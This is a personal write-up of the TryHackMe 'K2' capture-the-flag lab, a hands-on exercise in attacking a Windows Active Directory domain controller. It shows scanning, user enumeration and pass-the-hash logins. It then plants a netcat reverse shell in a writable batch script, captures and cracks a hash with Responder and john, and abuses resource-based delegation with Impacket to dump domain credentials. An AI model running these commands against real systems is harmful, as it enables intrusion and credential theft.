<h1 align="center">K2</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/566c97cf-ebc9-4118-a79a-b9e94a7044a4"><br>
2025, September 29<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>512</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>earn about techniques attackers use to steal account credentials.</em>.<br>
Access it <a href="https://tryhackme.com/room/xdrcredentialaccess"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/e0e01f2c-d3cd-496c-9508-ea76ced65af7"></p>



<h2 align="center">Task 3 . The Summit</h2>
<p>You are almost there; you can see the summit from where you stand. Even the IT team is impressed at how far you have made into the network.<br>

You can't stop now; with all of the information gathered, you will reach the very top and prove your skills.<br>

Please allow 3-5 minutes for the VM to fully start.</p>

<p><em>Answer the questions below</em></p>

<br>
<br>
<br>
<h3 align="center">Port Scanning</h3>
<p align="center">23 open ports</p>

<div align="center"><p>

| **Port**     | **System Service Name**                      |    
|-------------:|:---------------------------------------------|
| `53`         |`DNS` (Domain Name System)                    |
| `88`         |`Kerberos` Authentication                     |
| `135`        |`RPC` (Remote Procedure Call)                 |
| `139`        |`NetBIOS` Session Service                     |
| `389`        |`LDAP` (Lightweight Directory Access Protocol)|
| `445`        |`SMB` (Server Message Block)                  |
| `464`        |`KPASSWD` (Kerberos Password Change)          |
| `593`        |`RPC` over `HTTP` (ncacn_http)                |
| `636`        |`LAPS` (Secure LDAP)                          |
| `3268`       |`LDAP` Global Catalog                         |
| `3269`       |`LAPS` Global Catalog                         |
| `3389`       |`RDP` (Remote Desktop Control)                |
| `5985`       |`WinRM` (Windows Remote Management)           |
| `7680`       |Delivery Optimization (pando-pub)            |
| `9389`       |.Net Message Framing (mc-nmf)                |
| `49667`      |`RPC` (Remote Procedure Call)                 |
| `49668`      |`RPC` (Remote Procedure Call)                 |
| `49669`      |`RPC` over `HTTP` (ncacn_http)                |
| `49674`      |`RPC` (Remote Procedure Call)                 |
| `49679`      |`RPC` (Remote Procedure Call)                 |
| `49702`      |`RPC`, Remote Procedure Call                  |

</p></div><br>

```bash
:~/K2# nmap -sT xx.xxx.xxx.xx
...
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

<p align="center">Naming in Active Directory</p>

<div align="center"><p>

| **Attribute**                   |**Name**              |
|:--------------------------------|:---------------------|
|NetBIOS Domain Name              |K2                    |
|NetBIOS Computer Name            |K2ROOTDC              |
|DNS Domain Name                  |k2.thm                |
|DNS Computer Name(FQDN)          |K2RootDC.k2.thm       |
|DNS Tree Name                    |k2.thm                |

</p></div><br>

```bash
:~/K2# nmap -sC -sV -Pn -n -p- -T4 xx.xxx.xxx.xx
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 xx:xx:xxZ)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-30Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2025-09-29Txx:xx:xx
|_Not valid after:  2026-03-31Txx:xx:xx
|_ssl-date: 2025-09-30Txx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: K2ROOTDC, NetBIOS user: <unknown>, NetBIOS MAC: 1... (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-30Txx:xx:xx
|_  start_date: N/A
```

<h3 align="center">Static Host Mapping</h3>

```bash
xx.xxx.xxx.xx   K2ROOTDC k2.thm K2RootDC.k2.thm
```

<h3 align="center">User Validation</h3>
<p align="center">Identified r.bud, j.bold and j.smith in Task 2</p>

<img width="1910" height="344" alt="{C22ADEF5-247F-4FA0-B1C8-D40C89F39EB4}" src="https://github.com/user-attachments/assets/cf011daa-3047-42c5-b0fa-8489a059f34f" />

<br>
<br>
<br>
<p align="center">A.txt</p>

```bash
r.bud
j.bold
j.smith
```

<p align="center">Valid Username</p>
<p align="center">j.smith</p>

```bash
:~/K2# kerbrute userenum --dc K2ROOTDC -d k2.thm A.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
...
2025/09/30 xx:xx:xx >  [+] VALID USERNAME:	 j.smith@k2.thm
```

<h3 align="center">Shell as <strong>j.smith</strong></h3>
<p align="center">The hash identified for Administrator in Task 2 (••••••••••••••••••••••••••••••••) allowed to obtain shell.</p>

<br>
<br>
<br>

```bash
:~/K2# nxc smb K2RootDC.k2.thm -u 'j.smith' -H '••••••••••••••••••••••••••••••••'
SMB         xx.xxx.xxx.xx   445    K2ROOTDC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2ROOTDC) (domain:k2.thm) (signing:True) (SMBv1:False) 
SMB         xx.xxx.xxx.xx   445    K2ROOTDC         [+] k2.thm\j.smith:•••••••••••••••••••••••••••••••• 
```

```bash
:~/K2# nxc winrm K2RootDC.k2.thm -u 'j.smith' -H '••••••••••••••••••••••••••••••••'
WINRM       xx.xxx.xxx.xx   5985   K2ROOTDC         [*] Windows 10 / Server 2019 Build 17763 (name:K2ROOTDC) (domain:k2.thm) 
WINRM       xx.xxx.xxx.xx   5985   K2ROOTDC         [+] k2.thm\j.smith:•••••••••••••••••••••••••••••••• (Pwn3d!)
```

```bash
:~/K2# evil-winrm -i K2RootDC.k2.thm -u 'j.smith' -H '••••••••••••••••••••••••••••••••'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.smith\Documents>
```

<img width="1915" height="551" alt="{51BBCEF2-2489-4B24-9F51-3F4D960CFB8B}" src="https://github.com/user-attachments/assets/956a27bd-70ff-41e7-9bd6-c1df98ca8a3a" />

<br>
<br>
<br>
<p align="center">Users: Administrator, j.smith, o.armstrong and Public.</p>

```bash

*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/30/2025   7:29 PM                Administrator
d-----        5/30/2023   2:29 AM                j.smith
d-----        5/30/2023   1:31 AM                o.armstrong
d-r---       12/12/2018   7:45 AM                Public


*Evil-WinRM* PS C:\Users>
```

<p align="center">Identified /Scripts.</p>

```bash
*Evil-WinRM* PS C:\Users\j.smith\Documents> dir C:\


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---       11/14/2018   4:10 PM                Program Files
d-----        3/11/2021   7:29 AM                Program Files (x86)
d-----        5/30/2023   1:32 AM                Scripts
d-r---        5/30/2023   2:29 AM                Users
d-----        5/30/2023   1:17 AM                Windows
```

<p align="center">Identified backup.bat and checked its content.</p>

```bash
*Evil-WinRM* PS C:\Users\j.smith\Documents> dir C:\Scripts


    Directory: C:\Scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/30/2023   1:32 AM             92 backup.bat


*Evil-WinRM* PS C:\Users\j.smith\Documents> cat C:\Scripts\backup.bat
copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```

<p align="center">Identified (F) Full Access for j.smith to C:\Scripts.</p>

```bash
*Evil-WinRM* PS C:\Users\j.smith\Documents> icacls C:\Scripts
C:\Scripts K2\j.smith:(F)
           K2\o.armstrong:(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           BUILTIN\Users:(I)(CI)(AD)
           BUILTIN\Users:(I)(CI)(WD)
           CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

<p align="center">Which is not the case to C:\Scripts\backup.bat.</p>

```bash
*Evil-WinRM* PS C:\Users\j.smith\Documents> icacls C:\Scripts\backup.bat
C:\Scripts\backup.bat NT AUTHORITY\SYSTEM:(I)(F)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Users:(I)(RX)
                      K2\o.armstrong:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

<p align="center">Copied nc.exe into the Target.</p>

```bash
:~/K2# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
*Evil-WinRM* PS C:\Scripts> curl http://xx.xxx.xxx.xxx:8000/nc.exe -o C:\Windows\System32\Tasks\nc.exe
```

```bash
:~/K2# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xxx.xx - - [30/Sep/2025 xx:xx:xx] "GET /nc.exe HTTP/1.1" 200 -
```

<img width="1922" height="232" alt="{D970E571-8856-4FC4-B764-A14402673FAA}" src="https://github.com/user-attachments/assets/444fbd5c-334a-49b5-b6e0-9392036b5eea" />

<br>
<br>
<br>

<p align="center">Granted Full Access to Everyone.</p>

```bash
*Evil-WinRM* PS C:\Scripts> icacls C:\Windows\System32\Tasks\nc.exe /grant Everyone:F
processed file: C:\Windows\System32\Tasks\nc.exe
Successfully processed 1 files; Failed processing 0 files
```

<p align="center">Deleted backup.bat.</p>

```bash
*Evil-WinRM* PS C:\Scripts> del backup.bat
```

<p align="center">Set up a Listener.</p>

```bash
:~/K2# nc -nlvp 1234
```

<p align="center">Created a new backup.bat and inspected its content.</p>

```bash
*Evil-WinRM* PS C:\Scripts> Set-Content -Path "C:\Scripts\backup.bat" -Value "C:\Windows\System32\Tasks\nc.exe xx.xxx.xxx.xxx 1234 -e powershell"
```

```bash
*Evil-WinRM* PS C:\Scripts> cat backup.bat
C:\Windows\System32\Tasks\nc.exe xx.xxx.xxx.xxx 1234 -e powershell
```

<br>
<br>
<br>

```bash
:~/K2# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on xx.xxx.xxx.xx 49898
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Windows\system32> whoami
whoami
k2\o.armstrong
```

<img width="1739" height="795" alt="{4F58079F-0240-41D7-9FBF-28B0761D6FAB}" src="https://github.com/user-attachments/assets/af224fbd-18fc-44e8-99f6-c5c9934b0e24" />

<br>
<br>
<br>

```bash
PS C:\Windows\system32> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes                                                     
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-•-•-•                                      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Performance Log Users               Alias            S-•-•-••-•••                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Remote Management Users             Alias            S-•-•-••-•••                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                               Alias            S-•-•-••-•••                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-•-•-••-•••                                 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\BATCH                          Well-known group S-•-•-•                                      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                               Well-known group S-•-•-•                                      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users            Well-known group S-•-•-••                                     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization              Well-known group S-•-•-••                                     Mandatory group, Enabled by default, Enabled group             
LOCAL                                       Well-known group S-•-•-•                                      Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity  Well-known group S-•-••-•                                     Mandatory group, Enabled by default, Enabled group             
K2\IT Director                              Alias            S-•-•-••-••••••••••-••••••••••-••••••••-•••• Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Plus Mandatory Level Label            S-•-••-••••                         
```

```bash
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Windows\system32> 
```

<br>
<br>
<br>

<p align="center">Set up a Responder to capture o.armstrong´s hash.</p>

```bash
:~/K2# sudo responder -I ens5
```

<p align="center">Interacted with Attack VM.</p>

```bash
PS C:\Windows\system32> dir \\xx.xxx.xxx.xxx\test\
```

<p align="center">Captured Target VM interaction and o.armstrong´s hash.</p>

```bash
:~/K2# sudo responder -I ens5
...
[SMB] NTLMv2-SSP Client   : xx.xxx.xxx.xx
[SMB] NTLMv2-SSP Username : K2\o.armstrong
[SMB] NTLMv2-SSP Hash     : o.armstrong::K2:...
```

<p align="center">Obtained o.armstrong´s password.</p>

```bash
:~/K2# john Hash --wordlist=/usr/share/wordlists/rockyou.txt
...
⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃      (o.armstrong)
```

<br>
<br>
<br>

<h3 align="center">Shell as <strong>o.armstrong</strong></h3>

```bash
:~/K2# evil-winrm -i K2RootDC.k2.thm -u 'o.armstrong' -p '⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃'

*Evil-WinRM* PS C:\Users\o.armstrong\Documents> whoami
k2\o.armstrong
```

```bash
*Evil-WinRM* PS C:\Users\o.armstrong\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set
```

```bash
*Evil-WinRM* PS C:\Users\o.armstrong\Desktop> dir


    Directory: C:\Users\o.armstrong\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        5/30/2023   1:35 AM            136 notes.txt
-a----        5/30/2023   2:28 AM             38 user.txt


*Evil-WinRM* PS C:\Users\o.armstrong\Desktop> cat user.txt
THM{********************************}
```

<img width="1778" height="496" alt="{79790363-52AA-48B3-B11B-8B87DAACAF2D}" src="https://github.com/user-attachments/assets/8c1b8daa-9128-47a4-bd31-a046a1032177" />

<br>
<br>
<br>
<p>3.1. What is the user flag?<br>
<code>THM{********************************}</code></p>
<br>
<br>
<br>

```bash
:~/K2# python3.9 /opt/impacket/build/scripts-3.9/addcomputer.py -method SAMR -computer-name 'RESEARCHER$' -computer-pass 'OhMyGod!123' -dc-host K2RootDC.k2.thm -domain-netbios k2.thm 'k2.thm/o.armstrong:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Successfully added machine account RESEARCHER$ with password OhMyGod!123.
```

```bash
:~/K2# python3.9 /opt/impacket/build/scripts-3.9/rbcd.py -delegate-from 'RESEARCHER$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.thm/o.armstrong:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-•-•-••-••••••••••-••••••••••-••••••••-••••)
[*] Delegation rights modified successfully!
[*] RESEARCHER$ can now impersonate users on K2ROOTDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-•-•-••-••••••••••••-••••••••••-••••••••-••••)
[*]     RESEARCHER$   (S-•-•-••-••••••••••-•••••••••••-••••••••-••••)
```

```bash
:~/K2# python3.9 /opt/impacket/build/scripts-3.9/getST.py -spn 'cifs/K2RootDC.k2.thm' -impersonate 'Administrator' 'k2.thm/RESEARCHER$:OhMyGod!123'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

```bash
:~/K2# export KRB5CCNAME=Administrator.ccache
```

<p align="center">⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆</p>

```bash
:~/K2# python3.9 /opt/impacket/build/scripts-3.9/secretsdump.py -k -no-pass 'k2.thm/Administrator@K2RootDC.k2.thm'
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
K2\K2ROOTDC$:plain_password_hex:...
K2\K2ROOTDC$:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
[*] DPAPI_SYSTEM 
...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
j.smith:1111:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
o.armstrong:1113:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
K2ROOTDC$:1008:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
xx.xxx.x.xx$:1116:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
xx.xxx.xx.xxx$:1117:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
ATTACKERSYSTEM$:1118:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
RESEARCHER$:1119:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃:::
[*] Kerberos keys grabbed
...
[*] Cleaning up... 
```

<h3 align="center">Shell as <strong>Administrator</strong></h3>

```bash
:~/K2# evil-winrm -i K2RootDC.k2.thm -u 'administrator' -H '⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
k2\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```


```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        5/30/2023   2:28 AM             37 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
THM{********************************}
```

<p>3.2. What is the root flag?<br>
<code>THM{********************************}</code></p>

<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7481af48-ab9d-4c7f-8dfd-bac3e321ff23"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/b2ac7b31-057d-4f22-ae8d-bcfa50500ae4"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|30      |Hard 🚩 - <strong>K2</strong>          | 512    |     108ᵗʰ    |      4ᵗʰ     |     211ˢᵗ    |     5ᵗʰ    | 128,305  |    982    |    76     |
|29      |Medium 🔗 - XDR: Credential Access     | 511    |     109ᵗʰ    |      4ᵗʰ     |     211ˢᵗ    |     5ᵗʰ    | 127,880  |    981    |    76     |
|29      |Medium 🚩 - XDR: Operation Global Dagger| 511   |     109ᵗʰ    |      4ᵗʰ     |     217ᵗʰ    |     5ᵗʰ    | 127,784  |    980    |    76     |
|28      |Hard 🚩 - Sea Surfer, in progress      | 510    |     -        |      4ᵗʰ     |     -        |     -      | -        |    979    |    76     |
|28      |Medium 🔗 - Windows PrivEsc Arena, in progress|510 | -         |      4ᵗʰ     |     -        |     -      | -        |    979    |    76     |
|27      |Medium 🚩 - Backtrack                  | 509    |     109ᵗʰ    |      4ᵗʰ     |     318ᵗʰ    |     5ᵗʰ    | 127,334  |    979    |    76     |
|26      |Medium 🚩 - ContainMe                  | 508    |     109ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,304  |    978    |    76     |
|26      |Medium 🚩 - Sequence                   | 508    |     110ᵗʰ    |      4ᵗʰ     |     301ˢᵗ    |     5ᵗʰ    | 127,274  |    977    |    76     |
|25      |Medium 🔗 - Introduction to Honeypots  | 507    |     109ᵗʰ    |      4ᵗʰ     |     305ᵗʰ    |     5ᵗʰ    | 127,214  |    976    |    76     |
|25      |Medium 🔗 - Windows x64 Assembly       | 507    |     109ᵗʰ    |      4ᵗʰ     |     303ʳᵈ    |     5ᵗʰ    | 127,110  |    975    |    76     | 
|25      |Easy 🔗 - Network Secuity Essentials   | 507    |     112ⁿᵈ    |      4ᵗʰ     |     302ⁿᵈ    |     5ᵗʰ    | 126,990  |    974    |    76     | 
|24      |Medium 🔗 - Linux Threat Detection 1   | 506    |     110ᵗʰ    |      4ᵗʰ     |     330ᵗʰ    |     5ᵗʰ    | 126,894  |    973    |    76     | 
|24      |Hard 🚩 - Iron Corp                    | 506    |     111ˢᵗ    |      4ᵗʰ     |     363ʳᵈ    |     5ᵗʰ    | 126,768  |    972    |    76     |    
|23      |Medium 🔗 - Intro to Credential Harvesting|505  |     109ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     5ᵗʰ    | 126,768  |    971    |    76     |    
|22      |                                        | 504   |              |      4ᵗʰ     |              |             |         |           |    76     |    
|21      |                                        | 503   |              |      4ᵗʰ     |              |             |         |           |    76     |    
|20      |                                        | 502   |              |      4ᵗʰ     |              |             |         |           |    76     |    
|19      |                                        | 501   |              |      4ᵗʰ     |              |             |         |           |    76     |        
